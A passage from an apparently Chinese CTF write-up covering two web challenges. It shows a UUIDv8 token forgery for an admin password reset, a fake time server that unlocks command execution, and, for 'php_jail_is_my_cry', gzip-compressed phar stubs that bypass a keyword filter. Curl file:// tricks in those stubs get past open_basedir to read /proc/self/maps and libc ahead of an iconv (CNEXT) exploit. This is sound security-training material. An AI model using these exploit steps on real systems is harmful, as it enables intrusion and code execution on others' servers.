</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Generate a UUID from three custom blocks.
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">    * &#39;a&#39; is the first 48-bit chunk of the UUID (octets 0-5);
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s2">    * &#39;b&#39; is the mid 12-bit chunk (octets 6-7);
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">    * &#39;c&#39; is the last 62-bit chunk (octets 8-15).
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s2">    When a value is not specified, a pseudo-random value is generated.
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">a</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">if</span> <span class="n">b</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">if</span> <span class="n">c</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">62</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">&amp;</span> <span class="mh">0xffff_ffff_ffff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">80</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0x3fff_ffff_ffff_ffff</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="c1"># Set version and variant flags</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">76</span><span class="p">)</span>  <span class="c1"># Version 8</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="mh">0x02</span> <span class="o">&lt;&lt;</span> <span class="mi">62</span><span class="p">)</span>  <span class="c1"># Variant 10xx (RFC4122)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="nb">int</span><span class="o">=</span><span class="n">int_uuid_8</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span></code></pre></div><p>在远端也生成一下token</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984425-3.png"></p>
<p>成功修改密码</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984425-4.png"></p>
<p>/execute_command 会从设置的时间api获取时间</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-5.png"></p>
<p>获取的时间大于2066年才可以命令执行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">fake_time</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="s2">&#34;date&#34;</span><span class="p">:</span> <span class="s2">&#34;2067-01-01T12:00:00&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span> <span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5006</span><span class="p">)</span>
</span></span></code></pre></div><p>vps起个服务</p>
<p>命令执行没回显，flag写静态目录</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-6.png"></p>
<h2 id="php_jail_is_my_cry">php_jail_is_my_cry<a hidden class="anchor" aria-hidden="true" href="#php_jail_is_my_cry">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;down&#39;</span><span class="o">])){</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    include <span class="s1">&#39;/tmp/&#39;</span> . basename<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;down&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    exit<span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">// 上传文件
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> . basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s2">&#34;file&#34;</span><span class="o">][</span><span class="s2">&#34;name&#34;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s2">&#34;file&#34;</span><span class="o">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> curl_init<span class="o">(</span><span class="s1">&#39;file://&#39;</span>. <span class="nv">$orig</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    
</span></span><span class="line"><span class="ln">13</span><span class="cl">    // I hide a trick to bypass open_basedir, I<span class="s1">&#39;m sure you can find it.
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s1">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s1">    $data = curl_exec($ch);
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s1">    curl_close($ch);
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s1">    if (stripos($data, &#39;</span>&lt;?<span class="s1">&#39;) === false &amp;&amp; stripos($data, &#39;</span>php<span class="s1">&#39;) === false &amp;&amp; stripos($data, &#39;</span>halt<span class="err">&#39;</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        file_put_contents<span class="o">(</span><span class="nv">$target_file</span>, <span class="nv">$data</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> null<span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>这里可以文件上传，而且可以包含tmp目录下的文件，但是文件上传有waf，不能有<code>&lt;?` 或者 `php` 或者 `halt</code>。这里还有个提示说藏了个绕过open_basedir的trick，后面会用到。</p>
<p>前面这个跟 DeadsecCTF2025 的一道web题很像，利用了include 的一个trick，我们可以将phar文件压缩后再include，php会根据不同类型的压缩包对其进行解压后再当成phar解析。利用这个，我们就可以绕过waf，文件包含代码执行了。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> new Phar<span class="o">(</span><span class="s1">&#39;exploit.phar&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$phar</span>-&gt;startBuffering<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="o">&lt;&lt;&lt;</span> <span class="s1">&#39;STUB&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    phpinfo<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    __HALT_COMPILER<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">?&gt;
</span></span><span class="line"><span class="ln">10</span><span class="cl">STUB<span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$phar</span>-&gt;setStub<span class="o">(</span><span class="nv">$stub</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$phar</span>-&gt;addFromString<span class="o">(</span><span class="s1">&#39;test.txt&#39;</span>, <span class="s1">&#39;test&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$phar</span>-&gt;stopBuffering<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">?&gt;
</span></span></code></pre></div><p>压缩成gz文件</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-7.png"></p>
<p>成功执行</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-8.png"></p>
<p>但是由于<strong>disable_functions</strong>和<strong>disable_classes</strong>写的很死，没办法直接命令执行。</p>
<p>后面留意到了iconv的版本，发现小于2.39，可以打cnext</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-9.png"></p>
<p>打cnext首先得拿maps和libc，由于open_basedir，我们只能读/var/www/html和/tmp</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-10.png"></p>
<p>但是绕过open_basedir的方法题目源码给出来了，所以先读个源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;文件已下载: &lt;a href=&#39;?down=</span><span class="si">$file_name</span><span class="s2">&#39;&gt;</span><span class="si">$file_name</span><span class="s2">&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;下载失败。&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">include</span> <span class="s1">&#39;/tmp/&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;down&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="c1">// 上传文件
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="nv">$orig</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file://&#39;</span><span class="o">.</span> <span class="nv">$orig</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span> <span class="c1">// secret trick to bypass, omg why will i show it to you!
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="c1"></span>    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;halt&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>利用这个方法把maps和libc写到web目录</p>
<p>maps</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;maps.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="o">&lt;&lt;&lt;</span> <span class="s1">&#39;STUB&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file:///proc/self/maps&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;/var/www/html/maps&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="nx">__HALT_COMPILER</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err">STUB;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">$phar-&gt;setStub($stub);
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;test&#39;);
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">$phar-&gt;stopBuffering();
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>libc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;libc.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="o">&lt;&lt;&lt;</span> <span class="s1">&#39;STUB&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="s1">&#39;file:///usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_PROTOCOLS_STR</span><span class="p">,</span> <span class="s2">&#34;all&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;/var/www/html/libc&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="nx">__HALT_COMPILER</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err">STUB;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">$phar-&gt;setStub($stub);
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;test&#39;);
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">$phar-&gt;stopBuffering();
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>生成payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">from</span> <span class="nn">ten</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span>
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">  9</span><span class="cl">
</span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="n">HEAP_SIZE</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
